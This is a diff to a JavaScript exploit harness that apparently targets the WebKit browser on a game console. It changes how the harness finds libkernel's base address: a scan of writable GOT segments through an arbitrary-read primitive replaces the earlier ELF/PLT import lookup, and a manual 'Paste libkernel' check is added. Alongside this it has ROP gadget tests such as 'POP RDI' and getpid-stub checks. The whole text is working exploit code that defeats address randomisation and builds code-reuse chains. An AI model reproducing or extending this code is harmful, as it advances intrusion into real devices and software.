@@ -29,10 +29,11 @@ import {
     resolveLibkernel,
     scanErrorIatChunk,
     isGetpidStub as lkIsGetpidStub,
+    verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828y";
+const BUILD_ID = "rw-20250828z";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -333,7 +334,8 @@ function isGetpidStub(v) {
 const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
-    { id: "scan-iat", group: "base", label: "Scan IAT" },
+    { id: "scan-iat", group: "base", label: "Scan RW GOT" },
+    { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
     { id: "stub20", group: "base", label: "getpid stub" },
     { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
@@ -404,6 +406,22 @@ function runManualTest(testId) {
                 mark("GADGET-OK", "libkernel " + r.lk + " (" + r.source + ")");
             else
                 mark("GADGET-BAD", r.error || "libkernel resolve failed");
+            return;
+        }
+        if (testId === "paste-lk") {
+            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
+            const lk = parseAddr(raw.replace(/^0x/i, ""));
+            if (!lk) {
+                mark("LK-SKIP", "enter libkernel base in hex box above, then tap Paste libkernel");
+                return;
+            }
+            const v = verifyManualLibkernel(p, lk);
+            if (v.ok) {
+                mark("LK-OK", "pasted " + lk + " (1-read verify)");
+                state("libkernel pasted OK", "ok");
+            } else {
+                mark("GADGET-BAD", v.error || "bad libkernel base");
+            }
             return;
         }
         if (testId === "scan-iat") {
@@ -1665,37 +1683,25 @@ async function runScanIat() {
     busy = true;
     setUi();
     iatScanState = null;
-    mark("LK-SCAN", "ELF DT_PLTGOT → GOT slots → PLT xrefs");
-    scanState("IAT scan…");
+    mark("LK-SCAN", "ELF mapped RW segments only (max 2 reads/slot)");
+    scanState("RW GOT scan…");
     let ticks = 0;
-    const maxTicks = 60000;
+    const maxTicks = 20000;
     try {
         while (ticks++ < maxTicks) {
             const chunk = scanErrorIatChunk(p, webkitBase, off, iatScanState);
             iatScanState = chunk.state;
-            if (chunk.phase === "elf-hit")
-                mark("LK-ELF", "DT_PLTGOT +0x" + chunk.gotPlt.toString(16));
-            else if (chunk.phase === "elf-miss")
-                mark("LK-PHASE", "no DT_PLTGOT — PLT xrefs in .text");
-            else if (chunk.phase === "gotplt-miss")
-                mark("LK-PHASE", "GOT walk miss — PLT xrefs");
-            else if (chunk.phase === "gotplt")
-                scanState("GOT slot " + chunk.gotIdx + "/384");
-            else if (chunk.phase === "code-region")
-                mark("LK-PHASE", "code " + chunk.region + " @+0x"
-                    + chunk.cursor.toString(16) + " q=" + chunk.queued
-                    + (chunk.note || ""));
-            else if (chunk.phase === "code-done")
-                mark("LK-PHASE", "code done — verify " + chunk.queued + " GOT slots");
-            else if (chunk.phase === "code-retry-mid")
-                mark("LK-PHASE", "verify miss — scan mid .text");
-            else if (chunk.phase === "code")
-                scanState("code " + (chunk.region || "?") + " +0x"
-                    + chunk.cursor.toString(16) + "…+0x"
-                    + (chunk.end || 0).toString(16)
-                    + " q=" + chunk.queued + " v=" + (chunk.verified || 0));
-            else if (chunk.phase === "verify")
-                scanState("verify GOT " + chunk.left + " left");
+            if (chunk.phase === "rw-start")
+                mark("LK-RW", "ranges: " + chunk.ranges);
+            else if (chunk.phase === "rw-region")
+                mark("LK-PHASE", "RW " + chunk.region + " @+0x"
+                    + chunk.cursor.toString(16));
+            else if (chunk.phase === "rw")
+                scanState("RW +0x" + chunk.cursor.toString(16)
+                    + "…+0x" + chunk.end.toString(16)
+                    + " tried=" + chunk.slots);
+            else if (chunk.phase === "no-rw")
+                mark("LK-MISS", "no mapped RW ELF segment in cap");
             if (chunk.done && chunk.lk) {
                 mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16)
                     + " (" + (chunk.source || "?") + ")");
@@ -1703,8 +1709,10 @@ async function runScanIat() {
                 break;
             }
             if (chunk.done) {
-                mark("LK-MISS", "no __imp___error via ELF/PLT");
-                state("IAT scan miss", "bad");
+                mark("LK-MISS", "no libkernel import in RW GOT"
+                    + (chunk.slots ? " (" + chunk.slots + " slots)" : "")
+                    + " — paste base or cal");
+                state("RW GOT miss", "bad");
                 break;
             }
             if ((ticks & 31) === 0)
@@ -1729,9 +1737,10 @@ async function runScanIat() {
 async function ensureLibkernel(p, off, webkitBase) {
     let r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
     if (r.ok) return r.lk;
-    mark("NATIVE-STEP", "libkernel (ELF/PLT — not brute GOT)…");
+    mark("NATIVE-STEP", "RW GOT scan…");
     let state = null;
-    while (true) {
+    let ticks = 0;
+    while (ticks++ < 20000) {
         const chunk = scanErrorIatChunk(p, webkitBase, off, state);
         state = chunk.state;
         if (chunk.done && chunk.lk) {
@@ -1741,7 +1750,7 @@ async function ensureLibkernel(p, off, webkitBase) {
         if (chunk.done) break;
         await new Promise(r => setTimeout(r, 0));
     }
-    throw new Error("libkernel IAT not found — tap Scan IAT first");
+    throw new Error("libkernel unknown — Scan RW GOT or Paste libkernel in hex box");
 }
 
 function stripUiForNative() {
@@ -2158,7 +2167,7 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — IAT via ELF/PLT xref (not brute GOT)");
+    mark("BOOT", "build=" + BUILD_ID + " — libkernel: RW GOT scan or paste base");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
